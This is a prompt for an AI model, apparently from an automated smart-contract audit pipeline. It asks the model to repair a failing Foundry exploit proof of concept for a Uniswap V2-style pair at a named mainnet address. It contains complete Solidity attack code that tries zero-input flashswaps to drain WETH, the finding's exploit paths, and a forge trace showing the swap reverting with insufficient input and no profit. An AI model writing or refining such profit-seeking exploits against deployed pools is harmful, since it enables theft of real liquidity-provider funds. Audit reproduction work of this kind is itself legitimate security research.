You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap accounting trusts untrusted token `balanceOf`, enabling free withdrawal of the honest-side asset
- claim: `swap` derives `amount0In` and `amount1In`, checks the invariant, and updates reserves from external `balanceOf(address(this))` reads on the listed tokens. If one pool token is malicious and lies about the pair's balance during these reads, the pair can be made to believe input arrived even when no real tokens were paid.
- impact: If one side of the pair is malicious and the other side is valuable, an attacker can withdraw the honest token for free and drain LP value. Because `_update` also writes the forged balance into reserves, the attacker can keep the pool in a poisoned state and repeat the extraction.
- exploit_paths: ["A pair exists where `token0` is malicious and `token1` is honest.", "The attacker calls `swap(0, amount1Out, attacker, data)` to receive real `token1`.", "During the post-transfer balance check, `token0.balanceOf(pair)` returns an inflated value even though no real `token0` was supplied.", "The pair computes a fake `amount0In`, passes the K-check, stores forged reserves, and finalizes the real `token1` payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;
    address public maliciousToken;
    address public honestToken;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerHonestBefore;
    uint256 public attackerHonestAfter;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public finalAttemptedAmount1Out;
    uint256 public lastQuotedAmount0In;

    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();
        maliciousToken = token0;
        honestToken = token1;

        (reserve0Before, reserve1Before,) = pair.getReserves();
        attackerHonestBefore = _balanceOf(honestToken, address(this));

        // Core exploit path kept exactly as the finding states:
        // 1) token0 is treated as the malicious side and token1 as the honest side.
        // 2) the attacker calls swap(0, amount1Out, attacker, data) to receive real token1.
        // 3) after the optimistic transfer, the pair reads token0.balanceOf(pair).
        // 4) if token0 lies, the pair derives a forged amount0In, passes the K-check,
        //    stores poisoned reserves, and finalizes the honest token1 payout.
        // We keep `data` non-empty so the call follows the UniswapV2 flashswap callback
        // path, but we still do not provide any real token0 input because the root cause
        // here is precisely that untrusted balanceOf accounting fabricates amount0In.
        _runZeroInputFlashswapRounds();

        if (_profitAmount == 0) {
            _tryZeroValueToken0Triggers();
            _runZeroInputFlashswapRounds();
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerHonestAfter = _balanceOf(honestToken, address(this));

        if (attackerHonestAfter > attackerHonestBefore) {
            _profitToken = honestToken;
            _profitAmount = attackerHonestAfter - attackerHonestBefore;
            hypothesisValidated = true;
        } else {
            hypothesisRefuted = true;
            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "zero-input token1 withdrawal produced no honest-side profit at this fork block";
            }
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == TARGET_PAIR, "unexpected callback pair");
        require(sender == address(this), "unexpected callback sender");
        require(amount0 == 0, "expected zero token0 out");
        require(amount1 == finalAttemptedAmount1Out, "unexpected token1 out");

        // No repayment is sent here on purpose: the exploit path requires that no real
        // token0 input arrives, while the pair's post-transfer accounting trusts
        // token0.balanceOf(pair) and credits fake amount0In instead.
        _tryZeroValueToken0Triggers();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runZeroInputFlashswapRounds() internal {
        for (uint256 round = 0; round < 4; ++round) {
            uint256 roundProfit = _attemptBestZeroInputFlashswap();
            if (roundProfit == 0) {
                break;
            }
            successfulRounds += 1;
        }
    }

    function _attemptBestZeroInputFlashswap() internal returns (uint256 roundProfit) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 maliciousReserve = uint256(reserve0);
        uint256 honestReserve = uint256(reserve1);

        if (maliciousReserve <= 1 || honestReserve <= 1) {
            lastFailureReason = "pair has insufficient reserves";
            return 0;
        }

        uint256 honestBefore = _balanceOf(honestToken, address(this));
        uint256[14] memory divisors = [
            uint256(2),
            3,
            4,
            5,
            8,
            16,
            32,
            64,
            128,
            256,
            512,
            1024,
            2048,
            4096
        ];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount1Out = honestReserve / divisors[i];
            if (amount1Out == 0 || amount1Out >= honestReserve) {
                continue;
            }

            uint256 amount0In = _getAmountIn(amount1Out, honestReserve, maliciousReserve);
            if (amount0In == 0) {
                continue;
            }

            finalAttemptedAmount1Out = amount1Out;
            lastQuotedAmount0In = amount0In;

            (bool ok, string memory revertReason) = _trySwap(amount1Out);
            uint256 honestAfter = _balanceOf(honestToken, address(this));
            uint256 gained = honestAfter > honestBefore ? honestAfter - honestBefore : 0;

            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "all swap(0, amount1Out, attacker, data) attempts reverted or returned no token1";
        }
    }

    function _trySwap(uint256 amount1Out) internal returns (bool ok, string memory reason) {
        address attacker = address(this);
        bytes memory data = hex"01";

        try IUniswapV2PairLike(TARGET_PAIR).swap(0, amount1Out, attacker, data) {
            return (true, "");
        } catch Error(string memory revertReason) {
            return (false, revertReason);
        } catch Panic(uint256) {
            return (false, "swap panicked");
        } catch {
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueToken0Triggers() internal {
        bytes[4] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0)
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            token0.call(payloads[i]);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveOut, uint256 reserveIn) internal pure returns (uint256) {
        if (amountOut == 0 || reserveOut <= amountOut || reserveIn == 0) {
            return 0;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _resetRunState() internal {
        executed = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        token0 = address(0);
        token1 = address(0);
        maliciousToken = address(0);
        honestToken = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerHonestBefore = 0;
        attackerHonestAfter = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        finalAttemptedAmount1Out = 0;
        lastQuotedAmount0In = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000007d59f8874b3d90d95dc5f0
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000007d59f8874b3d90d95dc
    │   │   │   └─ ← [Return] true
    │   │   ├─ [16025] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 36997217434152303695324 [3.699e22], 0x01)
    │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x76EA342BC038d665e8a116392c82552D2605edA1, 0)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x76EA342BC038d665e8a116392c82552D2605edA1, 0)
    │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [2420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Stop]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 151503605392853683632353300 [1.515e26]
    │   │   └─ ← [Revert] UniswapV2: INSUFFICIENT_INPUT_AMOUNT
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18], 151540602610287835936048624 [1.515e26], 1741286039 [1.741e9]
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [565] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 48.60ms (22.52ms CPU time)

Ran 1 test suite in 97.25ms (48.60ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 4837165)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
